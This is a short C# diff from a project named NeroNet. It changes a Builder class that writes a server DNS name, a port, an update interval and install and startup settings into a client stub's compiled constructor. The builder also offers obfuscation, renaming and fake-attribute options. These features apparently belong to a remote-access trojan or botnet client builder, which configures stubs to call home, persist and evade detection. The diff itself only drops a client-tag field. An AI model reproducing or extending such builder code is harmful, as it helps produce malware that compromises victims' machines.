@@ -9,12 +9,11 @@ namespace NeroNet.Classes
     internal class Builder
     {
         //Build client
-        public void BuildClient(string Port, string DNS, string Name, string ClientTag, string UpdateInterval,
+        public void BuildClient(string Port, string DNS, string Name, string UpdateInterval,
             string Install, string Startup, bool Obfuscation, bool Renaming, int RenamingTextIndex, bool FakeAttributes)
         {
                 ClientSettings.DNS = DNS;
                 ClientSettings.Port = Port;
-                ClientSettings.ClientTag = ClientTag;
                 ClientSettings.UpdateInterval = UpdateInterval;
                 ClientSettings.Install = Install == "True" ? "True" : "False";
                 ClientSettings.Startup = Startup == "True" ? "True" : "False";           
@@ -31,10 +30,9 @@ namespace NeroNet.Classes
                         {
                             Constructor.Body.Instructions[0].Operand = ClientSettings.DNS;
                             Constructor.Body.Instructions[2].Operand = ClientSettings.Port;
-                            Constructor.Body.Instructions[4].Operand = ClientSettings.ClientTag;
-                            Constructor.Body.Instructions[6].Operand = ClientSettings.UpdateInterval;
-                            Constructor.Body.Instructions[8].Operand = ClientSettings.Install;
-                            Constructor.Body.Instructions[10].Operand = ClientSettings.Startup;
+                            Constructor.Body.Instructions[4].Operand = ClientSettings.UpdateInterval;
+                            Constructor.Body.Instructions[6].Operand = ClientSettings.Install;
+                            Constructor.Body.Instructions[8].Operand = ClientSettings.Startup;
                             if (!Directory.Exists(Environment.CurrentDirectory + @"\Clients"))
                                 Directory.CreateDirectory(Environment.CurrentDirectory + @"\Clients");
 
